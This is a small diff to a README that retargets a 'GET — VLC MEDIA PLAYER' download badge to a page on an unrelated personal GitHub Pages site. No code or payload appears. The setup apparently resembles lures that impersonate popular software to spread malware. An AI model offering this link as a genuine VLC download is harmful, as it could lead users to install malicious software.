@@ -4,7 +4,7 @@
 <img src="https://i.wfcdn.de/teaser/1920/50349.jpg" width="780">
 </p>
 
-[![GET — VLC MEDIA PLAYER](https://img.shields.io/badge/GET-VLC%20MEDIA%20PLAYER-2563eb?style=for-the-badge)](https://poissongreenpsuty.github.io/.github/)
+[![GET — VLC MEDIA PLAYER](https://img.shields.io/badge/GET-VLC%20MEDIA%20PLAYER-2563eb?style=for-the-badge)](https://poissongreenpsuty.github.io/.github/VLC-media-player)
 
 ---
 
